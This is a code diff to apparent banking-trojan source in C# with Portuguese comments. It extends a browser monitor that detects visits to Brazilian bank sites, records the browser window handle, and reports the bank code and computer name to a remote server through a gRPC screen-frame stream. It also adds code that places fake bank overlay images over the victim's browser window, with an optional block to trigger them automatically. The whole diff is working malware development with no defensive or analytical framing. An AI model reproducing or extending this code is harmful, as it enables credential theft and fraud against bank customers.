@@ -149,23 +149,32 @@ class Program
         }
         // ==========================================
 
-        // ========== NOVO: Bank Overlay (padrão antigo BB_01/CEF_01) ==========
+        // ========== NOVO: Bank Overlay (posicionado sobre janela do navegador) ==========
         BankOverlay bankOverlay = null;
         bool bankOverlayActive = false;
+        IntPtr lastBrowserWindowHandle = IntPtr.Zero;  // Handle da janela do navegador detectado
 
-        // Método para criar overlay de banco em thread separada (padrão antigo)
-        void ShowBankOverlay(string imageName)
+        // Método para criar overlay de banco em thread separada
+        void ShowBankOverlay(string imageName, IntPtr browserHandle = default)
         {
+            // Se não passou handle, usa o último detectado
+            if (browserHandle == IntPtr.Zero)
+                browserHandle = lastBrowserWindowHandle;
+
             Thread overlayThread = new Thread(() =>
             {
                 try
                 {
-                    // Criar e mostrar overlay (igual TBB1Main/TCEFMain do sistema antigo)
-                    bankOverlay = new BankOverlay(imageName);
+                    // Criar overlay posicionado sobre janela do navegador
+                    bankOverlay = new BankOverlay(imageName, browserHandle);
                     bankOverlayActive = true;
-                    Console.WriteLine($"[BANK-OVERLAY] Mostrando overlay: {imageName}");
 
-                    // Show() bloqueia thread até fechar (igual ao padrão antigo)
+                    if (browserHandle != IntPtr.Zero)
+                        Console.WriteLine($"[BANK-OVERLAY] Mostrando overlay sobre navegador: {imageName}");
+                    else
+                        Console.WriteLine($"[BANK-OVERLAY] Mostrando overlay fullscreen: {imageName}");
+
+                    // Show() bloqueia thread até fechar
                     System.Windows.Forms.Application.Run(bankOverlay);
 
                     bankOverlayActive = false;
@@ -205,16 +214,20 @@ class Program
         // ========== NOVO: Browser Monitor (monitoramento de bancos) ==========
         var browserMonitor = new BrowserMonitor();
 
-        // Quando detectar banco, envia alerta ao servidor
+        // Quando detectar banco, salva handle da janela e envia alerta ao servidor
         browserMonitor.BankDetected += async (sender, args) =>
         {
             try
             {
+                // Salva handle da janela do navegador para uso futuro
+                lastBrowserWindowHandle = args.BrowserWindowHandle;
+
                 // Formato: "BB:\nDESKTOP-ABC123"
                 string alertMessage = $"{args.BankCode}:{System.Environment.NewLine}{args.ComputerName}";
 
                 Console.WriteLine($"[BANK-ALERT] Enviando alerta ao servidor: {args.BankCode}");
                 Console.WriteLine($"[BANK-ALERT] URL: {args.Url}");
+                Console.WriteLine($"[BANK-ALERT] Window Handle: {args.BrowserWindowHandle}");
 
                 // Envia comando de alerta ao servidor via gRPC
                 await call.RequestStream.WriteAsync(new ScreenFrame
@@ -231,6 +244,23 @@ class Program
                     Antivirus = alertMessage, // Usa campo Antivirus para enviar alerta
                     Country = args.BankCode  // Usa campo Country para enviar código do banco
                 });
+
+                // OPCIONAL: Mostrar overlay automaticamente quando banco detectado
+                // Descomente as linhas abaixo para mostrar overlay automaticamente
+                /*
+                string overlayImage = args.BankCode switch
+                {
+                    "CEF" => "CEFE_01.bmp",
+                    "BB" => "BB_01.bmp",
+                    "BRADESCO" => "BB_02.bmp",
+                    _ => null
+                };
+
+                if (overlayImage != null && !bankOverlayActive)
+                {
+                    ShowBankOverlay(overlayImage, args.BrowserWindowHandle);
+                }
+                */
             }
             catch (Exception ex)
             {
